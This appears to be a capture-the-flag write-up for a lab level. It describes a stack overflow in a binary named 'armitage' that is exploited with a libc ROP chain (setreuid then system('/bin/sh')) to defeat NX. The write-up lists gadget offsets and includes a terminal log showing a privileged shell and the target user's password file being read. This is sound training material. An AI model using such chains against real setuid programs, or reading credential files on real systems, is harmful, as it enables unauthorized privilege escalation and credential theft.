In this challenge, the stack is non-executable (NX enabled), but we are not constrained by a small buffer size, allowing us to overwrite the saved `RIP` directly.

Using GDB, we found the offset to the saved `RIP` to be 136 bytes. We can construct a ROP (Return-Oriented Programming) chain to bypass the NX protection. Instead of placing executable code on the stack, ROP chains reuse existing instructions (gadgets) and functions already loaded in memory.

Our ROP chain executes two sequential operations:

1. `setreuid(1020, 1020)`: Sets the real and effective user ID to `flag03` (`UID: 1020`), which is the owner of the binary.
2. `system("/bin/sh")`: Spawns a privileged shell.

We extracted the necessary gadgets, function offsets, and string references from libc using `ROPgadget` and `readelf`:

```text
# using ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "[TARGET]"
0x000000000010f78b : pop rdi ; ret
0x0000000000110a7d : pop rsi ; ret
0x000000000002882f : ret

# using ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh"
Strings information
============================================================
0x00000000001cb42f : /bin/sh

# using readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "[function-name]"
1050: 0000000000058750    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC_2.2.5
2801: 00000000001270d0   136 FUNC    WEAK   DEFAULT   17 setreuid@@GLIBC_2.2.5

```

The gadget `ret` (`0x2882f`) is included for 16-byte stack alignment required by `system` in x86-64 before executing `do_system`.

Applying the exploit via `exploit.py`:

```bash
level03@rainfall:~$ env -i bash -c '(cat in.bin; cat) | /home/level03/armitage'
  [ARMITAGE] I have a job for you, cowboy.
  [ARMITAGE] Transmission channel open.
[ARMITAGE] Prove yourself: 
[ARMITAGE] Invalid job format. Expected JOB:<data>
ls
README  armitage  armitage.c  exploit.py  in.bin
whoami
flag03
cat /home/flag03/.pass
8c33zqo7hytqnsx9h3nb4juf3rdjbd80

```